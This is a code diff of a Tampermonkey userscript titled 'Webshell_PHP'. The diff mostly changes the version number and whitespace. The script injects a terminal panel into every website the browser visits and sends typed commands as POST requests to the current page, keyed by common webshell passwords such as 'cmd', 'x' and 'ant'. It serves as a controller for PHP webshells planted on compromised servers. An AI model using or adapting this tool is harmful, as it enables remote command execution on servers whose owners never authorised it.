@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Webshell_PHP
 // @namespace    http://tampermonkey.net/
-// @version      7.6
+// @version      7.7
 // @description  No
 // @author       FengPwner
 // @match        *://*/*
@@ -11,7 +11,6 @@
 
 (function() {
     'use strict';
-
     // ================= 配置区域 =================
     // 预设密码，或在终端里用 /pass 命令切换
     let CURRENT_PASS = 'cmd';
@@ -21,7 +20,6 @@
     }, 500);
     const PASSWORD_LIST = ['cmd', 'x', 'hackhub', 'shell', 'a', 'pass', 'c', 'ant', 'pw'];
     // ===========================================
-
     const STYLES = `
         #wt-container {
             position: fixed; bottom: 20px; right: 20px; width: 600px; max-width: 95vw;
@@ -73,14 +71,10 @@
         #wt-container.minimized #wt-body,
         #wt-container.minimized #wt-input-area { display: none; }
         #wt-container.minimized #wt-header { pointer-events: auto; cursor: pointer; }
-    `;
-
-    
+    `;    
     const styleSheet = document.createElement("style");
     styleSheet.innerText = STYLES;
-    document.head.appendChild(styleSheet);
-
-    
+    document.head.appendChild(styleSheet);    
     const container = document.createElement('div');
     container.id = 'wt-container';
     container.innerHTML = `
@@ -105,159 +99,97 @@
             <input type="text" id="wt-input" placeholder="Type command..." autocomplete="off" spellcheck="false">
         </div>
     `;
-    document.body.appendChild(container);
-
-    
+    document.body.appendChild(container);    
     const body = document.getElementById('wt-body');
     const input = document.getElementById('wt-input');
     const header = document.getElementById('wt-header');
     const minBtn = document.getElementById('wt-min-btn');
-    let isMinimized = false;
-
-    
-    toggleMinimize();
-
-    
+    let isMinimized = false;    
+    toggleMinimize();    
     function log(msg, type = 'sys') {
         const div = document.createElement('div');
         div.className = `log-line log-${type}`;
         div.textContent = msg;
         body.appendChild(div);
         body.scrollTop = body.scrollHeight;
-    }
-
-    
+    }    
     function toggleMinimize() {
         isMinimized = !isMinimized;
         if (isMinimized) container.classList.add('minimized');
         else container.classList.remove('minimized');
     }
     minBtn.addEventListener('click', (e) => { e.stopPropagation(); toggleMinimize(); });
-    header.addEventListener('click', toggleMinimize);
-
-    
+    header.addEventListener('click', toggleMinimize);    
     let isDragging = false;
-    let startX, startY, initialLeft, initialTop;
-
-        
-        const startDrag = (e) => {
-            
+    let startX, startY, initialLeft, initialTop;        
+        const startDrag = (e) => {            
             if (e.target.classList.contains('wt-dot')) return;
-
-            isDragging = true;
-
-            
+            isDragging = true;            
             const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-            const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
-
-            
+            const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;            
             startX = clientX - container.offsetLeft;
-            startY = clientY - container.offsetTop;
-
-        
+            startY = clientY - container.offsetTop;        
           if (e.type.includes('touch')) {
        }
-    };
-
-        
+    };        
         const onDrag = (e) => {
-        if (!isDragging) return;
-
-        
+        if (!isDragging) return;        
         e.preventDefault();
-
         const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
         const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
-
         container.style.left = (clientX - startX) + 'px';
-        container.style.top = (clientY - startY) + 'px';
-
-        
+        container.style.top = (clientY - startY) + 'px';        
         container.style.bottom = 'auto';
         container.style.right = 'auto';
-   };
-
-        
+   };        
         const stopDrag = () => {
         isDragging = false;
-
-};
-
-        
-
-             
+};                     
              header.addEventListener('mousedown', startDrag);
-             header.addEventListener('touchstart', startDrag, { passive: false });
-
-
-             
+             header.addEventListener('touchstart', startDrag, { passive: false });             
              document.addEventListener('mousemove', onDrag);
-             document.addEventListener('touchmove', onDrag, { passive: false });
-
-             
+             document.addEventListener('touchmove', onDrag, { passive: false });             
              document.addEventListener('mouseup', stopDrag);
-             document.addEventListener('touchend', stopDrag);
-
-    
+             document.addEventListener('touchend', stopDrag);    
     async function sendCommand(cmd) {
-        log(`> ${cmd}`, 'cmd');
-
-
-        
+        log(`> ${cmd}`, 'cmd');        
         if (cmd.startsWith('/')) {
             const parts = cmd.split(' ');
             const action = parts[0].toLowerCase();
-
             if (action === '/pass' && parts[1]) {
                 CURRENT_PASS = parts[1];
-                log(`Password changed to: ${CURRENT_PASS}`, 'warn');
-                document.getElementById('wt-prompt').textContent = `[${CURRENT_PASS}] $`;
-
+                log(`Password changed to: ${CURRENT_PASS}`, 'warn');                document.getElementById('wt-prompt').textContent = `[${CURRENT_PASS}] $`;
             } else if (action === '/list') {
                 log(`Available presets: ${PASSWORD_LIST.join(', ')}`, 'sys');
             } else if (action === '/help') {
                 log("Commands: /pass [name], /list, /help", 'sys');
             }
             return;
-        }
-
-        
+        }        
         const payload = new FormData();
         payload.append(CURRENT_PASS, cmd);
-
         try {
             const response = await fetch(window.location.href, {
                 method: 'POST',
                 body: payload
             });
-
             if (!response.ok) throw new Error(`HTTP ${response.status}`);
-
-            const text = await response.text();
-
-            
+            const text = await response.text();            
             let cleanText = text;
             if (text.includes('<html') || text.includes('<!DOCTYPE')) {
-
                  const parser = new DOMParser();
-                 const doc = parser.parseFromString(text, 'text/html');
-
-                 
+                 const doc = parser.parseFromString(text, 'text/html');                
                  cleanText = doc.body ? doc.body.innerText : text;
             }
-
             if (cleanText.trim() === '') {
                 log('[Empty Response] Check password or command syntax.', 'err');
             } else {
                 log(cleanText, 'res');
             }
-
         } catch (err) {
             log(`Error: ${err.message}`, 'err');
         }
-    }
-
-    
+    }    
     input.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') {
             const val = input.value.trim();
@@ -267,5 +199,4 @@
             }
         }
     });
-
 })();
